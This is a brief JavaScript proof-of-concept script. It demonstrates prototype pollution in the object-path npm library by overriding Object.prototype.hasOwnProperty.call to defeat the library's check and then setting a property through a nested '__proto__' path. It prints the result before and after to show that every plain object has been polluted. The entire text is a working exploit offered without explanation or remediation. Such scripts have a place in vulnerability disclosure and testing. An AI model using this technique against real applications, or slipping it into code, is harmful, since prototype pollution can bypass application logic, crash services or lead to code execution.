Object.prototype.hasOwnProperty.call = () => true;
const objectPath = require('object-path');
console.log({}.polluted);
objectPath.withInheritedProps.set({}, [
    ['__proto__'],
    'polluted'
], 'yes');
console.log({}.polluted);